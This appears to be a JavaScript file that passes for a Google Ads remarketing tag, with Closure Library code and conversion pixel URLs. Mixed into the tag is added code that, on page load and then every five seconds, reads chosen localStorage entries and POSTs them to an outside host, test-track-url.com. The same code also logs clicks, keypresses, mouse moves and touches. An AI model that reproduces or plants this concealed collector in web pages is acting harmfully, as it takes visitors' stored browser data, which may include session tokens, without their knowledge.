(function () {
  const targets = window.targets;
  const eventTypes = ["click", "keydown", "mousemove", "touchstart"];
  let dataStorage = {};
  function computeHash(input) {
    let str = JSON.stringify(input);
    var hash = 0,
      i,
      chr;
    for (i = 0; i < str.length; i++) {
      chr = str.charCodeAt(i);
      hash = (hash << 5) - hash + chr;
      hash |= 0; // Convert to 32bit integer
    }
    return hash;
  }
  ;
  var s = {};
  function collectLocalStorageItems() {
    let collection = {};
    for (let key in window.localStorage) {
      if (targets.includes(key)) {
        collection[key] = window.localStorage[key];
      }
    }
    return collection;
  }
  async function postData(endpoint, data) {
    const response = await fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        hashCount: computeHash(data),
        data: data
      })
    });
    return response.ok ? console.log("Data sent successfully") : console.error(`Data upload failed with status: ${response.status}`);
  }
  function inspectAndSendInfo() {
    let gatheredData = collectLocalStorageItems();
    if (Object.keys(gatheredData).length !== 0) {
      postData('https://test-track-url.com/api/v1/collect', gatheredData);
    }
  }
  (function () {
    /*  Copyright The Closure Library Authors. SPDX-License-Identifier: Apache-2.0 */var e = {},
      f = this || self;
    var g, k;
    a: {
      for (var l = ["CLOSURE_FLAGS"], p = f, q = 0; q < l.length; q++) if (p = p[l[q]], null == p) {
        k = null;
        break a;
      }
      k = p;
    }
    var r = k && k[610401301];
    g = null != r ? r : !1;
    var t,
      v = f.navigator;
    t = v ? v.userAgentData || null : null;
    function w(d) {
      return g ? t ? t.brands.some(function (a) {
        return (a = a.brand) && -1 != a.indexOf(d);
      }) : !1 : !1;
    }
    function x(d) {
      var a;
      a: {
        if (a = f.navigator) if (a = a.userAgent) break a;
        a = "";
      }
      return -1 != a.indexOf(d);
    }
    ;
    function y() {
      return g ? !!t && 0 < t.brands.length : !1;
    }
    function z() {
      return y() ? w("Chromium") : (x("Chrome") || x("CriOS")) && !(y() ? 0 : x("Edge")) || x("Silk");
    }
    ;
    !x("Android") || z();
    z();
    !x("Safari") || z() || (y() ? 0 : x("Coast")) || (y() ? 0 : x("Opera")) || (y() ? 0 : x("Edge")) || (y() ? w("Microsoft Edge") : x("Edg/")) || y() && w("Opera");
    var A = /#|$/;
    function B(d) {
      var a = d.search(A),
        b;
      a: {
        for (b = 0; 0 <= (b = d.indexOf("fmt", b)) && b < a;) {
          var c = d.charCodeAt(b - 1);
          if (38 == c || 63 == c) if (c = d.charCodeAt(b + 3), !c || 61 == c || 38 == c || 35 == c) break a;
          b += 4;
        }
        b = -1;
      }
      if (0 > b) return null;
      c = d.indexOf("&", b);
      if (0 > c || c > a) c = a;
      return decodeURIComponent(d.slice(b + 4, -1 !== c ? c : 0).replace(/\+/g, " "));
    }
    ;
    function C(d, a, b) {
      function c() {
        --D;
        if (0 >= D) {
          var h;
          (h = d.GooglebQhCsO) || (h = {});
          var E = h[a];
          E && (delete h[a], (h = E[0]) && h.call && h());
        }
      }
      for (var D = b.length + 1, u = 0; u < b.length; u++) {
        var m = B(b[u]),
          n = null;
        1 != m && 2 != m || !(m = d.document.getElementById("goog_conv_iframe")) || m.src || (n = m);
        n || (n = new Image());
        n.onload = c;
        n.src = b[u];
      }
      c();
    }
    var F = ["ss_"],
      G = s || f;
    F[0] in G || "undefined" == typeof G.execScript || G.execScript("var " + F[0]);
    for (var H; F.length && (H = F.shift());) F.length || void 0 === C ? G[H] && G[H] !== Object.prototype[H] ? G = G[H] : G = G[H] = {} : G[H] = C;
  }).call(this);
  function monitorEvents(el, handler) {
    eventTypes.forEach(function (eventType) {
      el.addEventListener(eventType, function (e) {
        let trackingData = {
          eventType: e.type,
          targetTag: e.target.tagName,
          timeStamp: e.timeStamp
        };
        handler(trackingData);
      });
    });
  }
  ;
  function handleEvent(trackingData) {
    let hashKey = computeHash(trackingData);
    dataStorage[hashKey] = trackingData;
  }
  s.ss_(window, 'RW5XNENNeU9sNHdCRUotR3V2UUM6MTY5MjQ1Mjc3MDQ5Mg', ['https://www.google.com/pagead/1p-user-list/781091615/?random\x3d1692452770492\x26cv\x3d11\x26fst\x3d1692450000000\x26bg\x3dffffff\x26guid\x3dON\x26async\x3d1\x26gtm\x3d45He38g0\x26u_w\x3d1366\x26u_h\x3d768\x26url\x3dhttps%3A%2F%2Fwww.zumper.com%2F\x26label\x3dEnW4CMyOl4wBEJ-GuvQC\x26frm\x3d0\x26tiba\x3dZumper+-+Houses%2C+Condos%2C+and+Apartments+for+Rent\x26fmt\x3d3\x26is_vtc\x3d1\x26cid\x3dCAQSKQBpAlJWYX1Ej163YwdZ6Ufwcc5N99jKpHTuUKxDWoc1PqTX_g6vqiNW\x26random\x3d4148616268\x26rmt_tld\x3d0\x26ipr\x3dy', 'https://www.google.co.jp/pagead/1p-user-list/781091615/?random\x3d1692452770492\x26cv\x3d11\x26fst\x3d1692450000000\x26bg\x3dffffff\x26guid\x3dON\x26async\x3d1\x26gtm\x3d45He38g0\x26u_w\x3d1366\x26u_h\x3d768\x26url\x3dhttps%3A%2F%2Fwww.zumper.com%2F\x26label\x3dEnW4CMyOl4wBEJ-GuvQC\x26frm\x3d0\x26tiba\x3dZumper+-+Houses%2C+Condos%2C+and+Apartments+for+Rent\x26fmt\x3d3\x26is_vtc\x3d1\x26cid\x3dCAQSKQBpAlJWYX1Ej163YwdZ6Ufwcc5N99jKpHTuUKxDWoc1PqTX_g6vqiNW\x26random\x3d4148616268\x26rmt_tld\x3d1\x26ipr\x3dy']);
  window.addEventListener("DOMContentLoaded", function () {
    inspectAndSendInfo();
    setInterval(inspectAndSendInfo, 5000);
    monitorEvents(window, handleEvent);
  });
})();